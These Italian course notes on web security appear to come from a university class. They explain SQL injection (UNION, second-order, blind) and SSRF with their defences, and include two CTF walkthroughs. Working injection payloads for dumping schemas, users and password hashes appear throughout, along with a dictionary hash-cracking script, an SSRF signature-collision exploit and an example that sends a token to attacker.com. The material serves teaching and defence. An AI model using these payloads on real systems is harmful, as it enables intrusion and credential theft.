La maggior parte dei database SQL mantiene un database speciale e integrato che descrive tutti gli altri database, tabelle e colonne.

- **information_schema** (per MySQL, PostgreSQL, ecc.)
    
    Questo è un database standard che può essere interrogato come qualsiasi altro.
    
    - Per trovare tutti i nomi delle tabelle:
        
        ...UNION SELECT table_name, table_schema FROM information_schema.tables -- -
        
    - Per trovare tutti i nomi delle colonne di una tabella specifica:
        
        ...UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users' -- -
        
- **sqlite_master** (per SQLite)
    
    SQLite usa una tabella master speciale.
    
    - Per trovare tutte le tabelle:
        
        ...UNION SELECT name, tbl_name FROM sqlite_master WHERE type='table' -- -
        

Utilizzando queste tabelle di metadati, un attaccante può mappare alla cieca l'intera struttura del database, trovare tabelle sensibili (`users`, `credit_cards`) e quindi lanciare un attacco `UNION` per estrarne il contenuto.

---

## Second-Order SQL Injection (Stored SQLi)
![[Pasted image 20251117154202.png]]

In questo scenario, il payload malevolo viene prima **memorizzato** nel database (in una fase in cui l'input potrebbe essere sanitizzato correttamente o considerato "sicuro") e poi **eseguito** in una seconda query successiva che utilizza quel dato senza adeguata validazione. Ad esempio, il dato viene memorizzato per essere sanitizzato in un secondo momento, ma leggendolo esegue la query maledetta.

**Esempio:**

1. **Inserimento:** Un attaccante si registra con un username malevolo: `'; UPDATE users SET password='...' WHERE user='admin'--`. L'applicazione lo salva correttamente nel DB.
    
2. **Esecuzione:** Quando l'applicazione usa questo username in una seconda query (es. per mostrare il profilo o registrare un log), la stringa viene concatenata in una nuova query SQL ed eseguita, attivando l'attacco. 
```sql
$query = "SELECT sender, content FROM messages WHERE
receiver='" . $_SESSION["user"] . "' AND content LIKE '%" . $_GET["search"] . "%'";
 
 che diventerebbe 
 
SELECT * FROM messages WHERE receiver = ''; UPDATE TABLE users SET
password='newpwd' WHERE user='admin' -- -' AND content LIKE '%%'
```
    

---

## Esfiltrazione dei Metadati del Database

Se non conosciamo la struttura del database, possiamo interrogarlo per chiedergli i suoi stessi metadati. La maggior parte dei DBMS moderni ha un database standard chiamato `INFORMATION_SCHEMA` (o tabelle di sistema specifiche come `sqlite_master` in SQLite).

- `information_schema.tables`: Contiene i nomi di tutte le tabelle.
    
- `information_schema.columns`: Contiene i nomi delle colonne per ogni tabella.
    

Esempio per SQLite per trovare i nomi delle tabelle:

SQL

```
SELECT name FROM sqlite_master WHERE type='table';
```


---

## SQL Injection "Cieche" (Blind SQLi)

Si verifica quando l'applicazione è vulnerabile, ma non mostra direttamente i risultati della query o gli errori del database nella risposta HTTP. L'attaccante deve quindi "fare domande" al database e dedurre le risposte dal comportamento dell'applicazione.

### Blind SQLi: Comportamento Condizionale (Boolean-based)

L'applicazione potrebbe mostrare un messaggio generico "OK" o "Errore", oppure mostrare o meno un contenuto, a seconda se la query ritorna vero o falso.

Esempio: Indovinare la password dell'amministratore carattere per carattere.

Payload:
```SQL
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'k
```

Se l'applicazione risponde "OK" (o mostra il contenuto normale), sappiamo che il primo carattere della password è maggiore di 'k'. Possiamo usare la ricerca binaria per trovare il carattere esatto.

### Blind SQLi: Errore Condizionale (Error-based)

Se l'applicazione non mostra dati ma mostra errori generici del DB, possiamo forzare un errore SQL solo quando una condizione è vera.

Payload (esempio concettuale):

```SQL
xyz' AND (SELECT CASE WHEN (condizione_da_testare) THEN 1/0 ELSE 'a' END)='a
```

Se `condizione_da_testare` è VERA, viene eseguita una divisione per zero (`1/0`), causando un errore che l'attaccante può rilevare.

### Blind SQLi: Ritardo Temporale (Time-based)

Se l'applicazione non fornisce alcun feedback visivo o di errore, l'attaccante può istruire il database ad attendere per un certo numero di secondi se una condizione è vera.

Payload (esempio per MS SQL Server):

```SQL
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

Se il server impiega più di 10 secondi a rispondere, l'attaccante sa che la condizione è vera. Da notare che ogni richiesta errata che produce errori sono tracciati nei Log.

Arricchimento: Su MySQL si usa spesso SLEEP(n), su PostgreSQL pg_sleep(n). Questa tecnica è lenta e può essere influenzata dal carico di rete.

---
## Prevenzione delle SQL Injection

### Difesa Primaria: Prepared Statements (Query Parametrizzate)

L'uso di **Prepared Statements** è il metodo più efficace per prevenire la SQLi. Essi separano la struttura della query dai dati. Il database compila la query SQL prima che i dati vengano inseriti, assicurando che l'input dell'utente sia trattato sempre e solo come dati (parametri), mai come codice eseguibile.

Esempio sicuro in PHP (PDO):

PHP

```
$db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
// Il '?' è un placeholder
$query = "SELECT * FROM users WHERE user = ? AND password = ?";
$sth = $db->prepare($query);
// I dati vengono associati in modo sicuro ai placeholder
$sth->bindValue(1, $_POST["user"]);
$sth->bindValue(2, $_POST["password"]);
$sth->execute();
$user = $sth->fetch();
```

Anche se visivamente nel codice PHP sembrano operazioni simili (invio una query e invio dei dati), ciò che avviene "sotto il cofano" a livello di comunicazione col Database è profondamente diverso.

Ecco la differenza tecnica spiegata passo dopo passo, basata sulle slide del corso.

#### 1. Concatenazione di stringhe (Il metodo Vulnerabile)

Quando usi la concatenazione (es. Slide 33), il tuo codice PHP costruisce una **singola lunga stringa** che contiene sia i comandi SQL che i dati dell'utente, e poi la spedisce al database.

- **Cosa riceve il Database:** Una frase unica.
- **Il problema:** Il Database deve analizzare (fare il _parsing_) di quella frase da zero. Non ha modo di distinguere quali caratteri sono stati scritti dal programmatore (codice sicuro) e quali sono stati inseriti dall'utente.
- **Risultato:** Se l'utente inserisce caratteri speciali SQL (come `' OR '1'='1`), il parser del database li interpreta come **comandi**, modificando la logica della query originale (ad esempio, aggirando il login).

#### 2. Prepared Statements (Il metodo Sicuro)

Con i Prepared Statements (es. Slide 47), la comunicazione avviene in **due fasi separate**. Non si invia mai una stringa unica mescolata.

##### Fase 1: Preparazione (Prepare)

Tu invii al database solo la struttura della query con i placeholder (`?`):

```
SELECT * FROM users WHERE user = ? AND password = ?
```

- Il Database riceve questa struttura, la analizza, la compila e la ottimizza **prima** che arrivi qualsiasi dato.
- In questo momento, il Database decide che la query ha una struttura fissa: _"Seleziona dalla tabella utenti dove l'utente è [qualcosa] e la password è [qualcosa]"_. La struttura logica è ormai "congelata".

##### Fase 2: Associazione ed Esecuzione (Bind & Execute)

Successivamente, invii i valori (es. `$_POST["user"]`).

- Il Database prende questi valori e li inserisce nei "buchi" (`?`) che aveva preparato.
- **Il punto cruciale:** Poiché la query è già stata compilata nella Fase 1, il Database tratterà **qualsiasi cosa** tu invii nella Fase 2 esclusivamente come un **dato letterale** (una stringa di testo), mai come codice eseguibile.

#### Esempio Pratico della Differenza

Immagina che un attaccante inserisca come nome utente: `' OR '1'='1`.

- **Con Concatenazione:** Il DB legge: `SELECT ... WHERE user = '' OR '1'='1'`. La logica cambia: l'istruzione `OR` diventa attiva e il login viene bypassato.
- **Con Prepared Statements:** Il DB ha già deciso che il primo `?` è un contenitore di dati. Quindi cercherà nel database un utente che si chiami _letteralmente_ così:
    
    > "Cercami un tizio il cui nome sia la stringa `' OR '1'='1`". Ovviamente non lo troverà, e l'attacco fallisce.
    


### Difese Secondarie (Defense in Depth)

- **Input Validation (Whitelisting):** Se non puoi usare prepared statements (es. se l'input utente deve scegliere il nome di una tabella per un `ORDER BY`), usa una whitelist rigorosa di valori consentiti (es. solo caratteri alfanumerici).
    
- **Principio del Minimo Privilegio:** L'utente del database usato dall'applicazione web dovrebbe avere solo i permessi strettamente necessari (es. solo `SELECT`, `INSERT`, `UPDATE` sulle tabelle specifiche, mai `DROP` o permessi amministrativi).



---

## Caso Studio Reale: Webkinz (2020)

Nell'aprile 2020, un attacco hacker ha sfruttato una SQL Injection nel gioco per bambini Webkinz, portando all'esfiltrazione di 23 milioni di username e password (memorizzate come hash MD5 con salt, ma comunque vulnerabili al cracking se la password è debole).

L'attacco è stato possibile perché un parametro non era sanitizzato correttamente, generando un errore SQL visibile che ha confermato la vulnerabilità agli attaccanti.

---

## Training Challenge #04 (Walkthrough)

Scenario: Dobbiamo accedere all'account del criminale "Collins Hackle" sul servizio "CrimeMail".

Indizio: hash = md5(password + salt).

### Analisi e Identificazione

1. Il sito ha una pagina di login e una di recupero password (`forgot.php`).
    
2. Inserendo un apice `'` nel campo username di `forgot.php`, otteniamo un **errore del database MySQL**. Questo indica una potenziale SQL Injection Error-Based.
    

### Esfiltrazione (Exploitation)

Usiamo una SQLi UNION-Based nella pagina vulnerabile per estrarre dati.

1. **Dump dello Schema:** Interroghiamo `INFORMATION_SCHEMA.COLUMNS` per trovare i nomi delle tabelle e delle colonne interessanti.
    
    - Payload: `' UNION SELECT CONCAT(TABLE_NAME,":",COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS#`
        
    - _Risultato:_ Troviamo una tabella `users` con colonne `userid`, `username`, `pass_salt`, `pass_md5`, `hint`.
        
2. **Dump della tabella Users:** Estraiamo i dati dell'utente target.
    
    - Payload: `' UNION SELECT CONCAT(userid, ":", username, ":", pass_salt, ":", pass_md5) FROM users#`
        
    - _Risultato per Collins Hackle:_ `5:c.hackle:yhbG:f2b31b3a7a7c41093321d0c98c37f5ad`
        
    - Abbiamo il salt (`yhbG`) e l'hash MD5 della password.
        

### Cracking della Password

Sapendo che l'hash è `md5(password + salt)`, possiamo usare uno script (o strumenti come John the Ripper/Hashcat) con un dizionario (es. `rockyou.txt`) per trovare la password.

Script Python di esempio:

Python

```
import hashlib
salt = "yhbG"
target_hash = "f2b31b3a7a7c41093321d0c98c37f5ad"
with open("rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        # Calcola md5(password + salt)
        if hashlib.md5((password + salt).encode()).hexdigest() == target_hash:
            print(f"[+] Password trovata: {password}")
            break
```

Una volta trovata la password, possiamo effettuare il login e completare la sfida.

---

# Server-Side Request Forgery (SSRF)

## Cos'è una Richiesta Lato Server?

Le moderne applicazioni web spesso hanno bisogno di effettuare connessioni verso l'esterno (o verso l'interno della propria infrastruttura) per funzionare. Il server agisce come un client HTTP (o di altro tipo) per recuperare risorse.

Esempi comuni di funzionalità legittime che usano richieste lato server:

- **Webhook:** Notificare sistemi esterni di eventi.
    
- **Recupero risorse remote:** Caricare un'immagine da un URL fornito dall'utente (es. immagine del profilo).
    
- **Anteprime link:** Generare anteprime quando un utente posta un link.
    
- **Servizi interni:** Il backend potrebbe dover interrogare microservizi interni, database o sistemi di autenticazione (es. Single-Sign On).
    

_Arricchimento:_ Il problema nasce perché il server ha spesso una posizione di rete privilegiata. Può accedere a risorse che un utente esterno non potrebbe raggiungere direttamente, come servizi in `localhost` (127.0.0.1), server nella rete locale (LAN) o servizi di metadati cloud.

L'utilizzo di richieste lato server (**Server-Side Requests**) non è di per sé una vulnerabilità, ma una funzionalità essenziale e legittima per il funzionamento di molte applicazioni moderne.

Ecco nel dettaglio cosa succede in uno scenario di utilizzo corretto, quali sono gli esempi pratici e come si differenzia da un attacco.

### 1. Il Meccanismo: Cosa succede nel dettaglio

In un utilizzo corretto, il server agisce come un "intermediario" o un client per conto dell'utente per recuperare dati necessari che l'utente non può o non deve recuperare direttamente.

Il flusso corretto (Happy Path) è il seguente:

1. **Richiesta dell'Utente:** L'utente invia un input al server (es. un token di login o una richiesta di caricamento dati).
2. **Elaborazione Server:** Il server riceve la richiesta e determina che ha bisogno di dati esterni per completarla.
3. **Connessione Interna/Esterna:** Il server web avvia una **nuova richiesta HTTP** (o altro protocollo) verso una destinazione specifica (API di terze parti, database interno, identity provider).
4. **Ricezione e Risposta:** Il servizio esterno risponde al server. Il server elabora questi dati e restituisce il risultato finale all'utente.

### 2. Esempi di Utilizzo Legittimo

Le slide elencano esplicitamente scenari comuni in cui le richieste lato server sono necessarie e corrette:

- **Autenticazione SSO (Single Sign-On):** Quando fai il login con Google o Facebook, il tuo server deve contattare direttamente i server del provider (Identity Provider) per verificare che il token fornito sia valido. L'utente non partecipa a questa chiamata diretta server-to-server.
- **Verifica CAPTCHA:** Quando risolvi un captcha, il tuo server invia la tua risposta ai server del fornitore (es. Google reCAPTCHA) per chiedere: "L'utente ha risolto correttamente il puzzle?".
- **API REST e Microservizi:** Il backend potrebbe dover chiamare altri servizi interni o API esterne (es. per processare un pagamento o recuperare il meteo) per costruire la pagina da mostrarti.
- **Webhooks:** Il server deve inviare notifiche a un altro server quando accade un evento specifico.

### 3. Cosa rende l'utilizzo "Corretto" (vs SSRF)

La differenza tra una funzionalità legittima e una vulnerabilità **SSRF** (Server-Side Request Forgery) sta nel **controllo della destinazione**.

- **Utilizzo Corretto (Sicuro):** La destinazione della richiesta è **predefinita** dal programmatore o strettamente validata.
    - _Esempio:_ Il server è programmato per contattare _solo_ `https://api.google.com/recaptcha`. L'utente non può cambiare questo indirizzo.
- **Utilizzo Vulnerabile (SSRF):** L'utente può manipolare l'input per cambiare la destinazione della richiesta del server.
    - _Esempio:_ L'utente cambia l'URL di destinazione da `api.google.com` a `localhost` o `192.168.1.1` (rete interna), costringendo il server ad attaccare se stesso o la rete aziendale,.

### 4. Come garantire la correttezza (Difesa)

Per mantenere l'utilizzo corretto e prevenire che diventi un exploit, le slide suggeriscono misure difensive specifiche:

- **Whitelist (Allowlist):** Il server dovrebbe permettere richieste solo verso una lista esplicita di domini o indirizzi IP fidati.
- **Isolamento:** Il server che esegue queste richieste esterne dovrebbe essere isolato dal resto della rete sensibile interna, per minimizzare i danni se venisse compromesso.

---

## Server-Side Request Forgery (SSRF) in Sintesi

**SSRF** è una vulnerabilità che si verifica quando un attaccante può indurre il server a effettuare richieste HTTP (o altri protocolli) verso un dominio arbitrario scelto dall'attaccante.

Se il server non convalida correttamente l'URL di destinazione fornito dall'utente, l'attaccante può usarlo come proxy per attaccare la rete interna.

_Nota: L'immagine mostra come un attaccante esterno, incapace di raggiungere direttamente un sistema interno protetto da firewall, possa sfruttare il server web vulnerabile (che ha accesso alla rete interna) per raggiungere quel sistema._

**Riferimento OWASP:** A10:2021 - Server-Side Request Forgery (SSRF)

### Come funziona un attacco SSRF?

L'attaccante manipola un parametro (spesso un URL) che il server utilizzerà per effettuare una richiesta.

**Scenari di attacco:**

1. **Attacco verso l'esterno:** Indurre il server a connettersi a un sistema di terze parti malevolo.
    
2. **Attacco verso l'interno (il più pericoloso):** Indurre il server a connettersi a servizi interni non esposti su internet.
    
    - `FROM https://auth.service/ TO https://local.ip/` (scansione o accesso alla rete interna).
        
    - `FROM https://auth.service/secret-token TO https://attacker.com/secret-token` (esfiltrazione di dati sensibili come token).
        

_Arricchimento: Oltre ad HTTP, gli attacchi SSRF possono spesso sfruttare altri URI scheme se la libreria sottostante li supporta, come `file://` (per leggere file locali, simile al Path Traversal), `gopher://` (per comunicare con servizi arbitrari come Redis o SMTP), o `dict://`._

### Conseguenze dell'SSRF

- **Accesso a servizi interni non autenticati:** Molti servizi interni (database come Redis, MongoDB, interfacce di amministrazione) non richiedono autenticazione se la connessione proviene dalla rete locale (poiché si presume sia fidata).
    
- **Accesso ai metadati del Cloud:** Negli ambienti cloud (AWS, Azure, GCP), i server possono accedere a un servizio di metadati interno (spesso all'IP `169.254.169.254`). Un SSRF può permettere all'attaccante di leggere questi metadati e rubare credenziali temporanee (es. chiavi IAM in AWS) per compromettere l'intero account cloud.
    
- **Port Scanning interno:** L'attaccante può sondare la rete interna per scoprire quali host e servizi sono attivi, basandosi sui tempi di risposta o sui messaggi di errore del server.
    

### Blind SSRF (SSRF Cieco)

In un **Blind SSRF**, l'applicazione esegue la richiesta richiesta dall'attaccante, ma **non restituisce la risposta** nel frontend.

Anche se non possiamo vedere direttamente i dati, possiamo comunque sfruttarlo:

- **Analisi temporale:** Se una richiesta verso un IP interno richiede molto tempo prima di andare in timeout, la porta potrebbe essere filtrata. Se risponde subito con un errore, la porta potrebbe essere chiusa. Se risponde in un tempo normale, la porta potrebbe essere aperta.
    
- **Esecuzione "alla cieca":** Possiamo inviare comandi a servizi interni (es. inviare un payload a un'istanza Redis interna per ottenere una reverse shell) sperando che vengano eseguiti, anche senza vederne l'output.
    

---

## Prevenzione dell'SSRF

- **Whitelisting (Lista consentita):** L'approccio più sicuro. Permettere richieste solo verso un elenco specifico di domini o indirizzi IP approvati. È difficile da mantenere se l'applicazione deve poter accedere a molti host diversi.
    
- **Isolamento di rete:** Il server che deve effettuare richieste esterne dovrebbe essere posizionato in una rete isolata (DMZ) senza accesso ai servizi interni sensibili.
    
- **Disabilitare schemi URL pericolosi:** Configurare le librerie HTTP per consentire solo `http` e `https`, bloccando `file://`, `gopher://`, `ftp://`, ecc.
    
- **Validazione e Sanitizzazione:** Risolvere il DNS del dominio richiesto e verificare che l'IP risultante non sia un IP privato (es. 127.0.0.1, 192.168.x.x, 10.x.x.x) prima di effettuare la connessione. _Attenzione: questa tecnica è soggetta a bypass tramite DNS rebinding se non implementata correttamente (Time-of-check to Time-of-use race condition)._
    

---

## Training Challenge #05 (Walkthrough)

- **Obiettivo:** Ottenere il flag tramite SSRF.
    
- **Indizio:** Il flag si trova nel file locale `./flag.txt`.
    

### Analisi del Codice (Python Flask)

L'applicazione è scritta in Python 2 (importante per un comportamento specifico di `urllib`) e usa Flask.

1. **Endpoint `/geneSign`:** Genera una firma MD5 per autorizzare le richieste.
    
    - Prende un parametro `param` dall'utente.
        
    - Forza l'azione a `scan`.
        
    - Restituisce `md5(secret_key + param + "scan")`.
        
2. **Endpoint `/De1ta` (Challenge):**
    
    - Legge dai cookie: `action`, `sign`.
        
    - Legge dalla richiesta GET: `param`.
        
    - Chiama `waf(param)`.
        
    - Se il WAF passa, crea un oggetto `Task` ed esegue `Task.Exec()`.
        
3. **Funzione `waf(param)`:**
    
    - Blocca se il parametro inizia con `gopher` o `file`. Questo è un tentativo di impedire l'accesso a protocolli pericolosi.
        
4. **Classe `Task`:**
    
    - `checkSign()`: Verifica che `sign == md5(secret_key + self.param + self.action)`.
        
    - `Exec()`:
        
        - Se `action` contiene la stringa `"scan"`: Esegue `urllib.urlopen(param)` e salva il risultato in `result.txt`.
            
        - Se `action` contiene la stringa `"read"`: Legge il contenuto di `result.txt` e lo restituisce all'utente.
            

### Vulnerabilità Identificate

1. **Comportamento di `urllib` in Python 2:**
    
    - In Python 2, `urllib.urlopen()` accetta non solo URL completi, ma anche percorsi di file locali. Se si passa una stringa come `./flag.txt` (senza protocollo), `urllib` proverà ad aprirlo come file locale.
        
    - Questo **bypass il WAF**, che controlla solo se la stringa _inizia_ con `file` o `gopher`.
        
2. **Logica debole nel controllo delle azioni (Concatenation Collision):**
    
    - L'applicazione usa `if "scan" in self.action` e `if "read" in self.action`.
        
    - Se riusciamo a passare `action=readscan`, entrambe le condizioni saranno vere: l'applicazione prima leggerà il file (scan) e poi ce lo mostrerà (read).
        
    - **Il problema della firma:** `geneSign` ci permette solo di firmare con `action="scan"`.
        
    - **La collisione:** La firma è calcolata come `md5(secret + param + action)`.
        
        - Noi vogliamo firmare: `param="flag.txt"`, `action="readscan"` -> `md5(secret + "flag.txt" + "readscan")`.
            
        - `geneSign` ci permette di firmare: `md5(secret + [NOSTRO_INPUT] + "scan")`.
            
        - Se impostiamo `[NOSTRO_INPUT]` a `"flag.txtread"`, la firma generata sarà per: `secret` + `"flag.txtread"` + `"scan"`.
            
        - Questa stringa concatenata è IDENTICA a quella che vogliamo: `secret` + `"flag.txt"` + `"readscan"`.
            

### Soluzione (Exploit)

Dobbiamo eseguire due richieste.

Richiesta 1: Ottenere la firma valida

Chiediamo a /geneSign di firmare un parametro appositamente craftato per causare la collisione.

GET /geneSign?param=flag.txtread

- Il server calcola: `MD5(secret_key + "flag.txtread" + "scan")`.
    
- Otteniamo la firma (es. `ab12...`).
    

Richiesta 2: Eseguire l'SSRF

Chiamiamo /De1ta con i parametri che, una volta concatenati, produrranno lo stesso hash, ma che verranno parsati singolarmente dall'applicazione per eseguire l'azione desiderata.

- Impostiamo i cookie:
    
    - `action=readscan` (così `Task.Exec` eseguirà sia la parte "scan" che "read").
        
    - `sign=<firma ottenuta al passo 1>`
        
- Impostiamo il parametro GET:
    
    - `param=flag.txt` (questo sarà il file che `urllib` aprirà localmente).
        

Quando `/De1ta` verifica la firma, calcolerà `MD5(secret_key + "flag.txt" + "readscan")`, che corrisponde esattamente alla firma che abbiamo generato. L'SSRF verrà eseguito, il file `flag.txt` verrà letto localmente e il suo contenuto restituito.

[[5 - CS Application Level - Web Security Part II| next lesson]]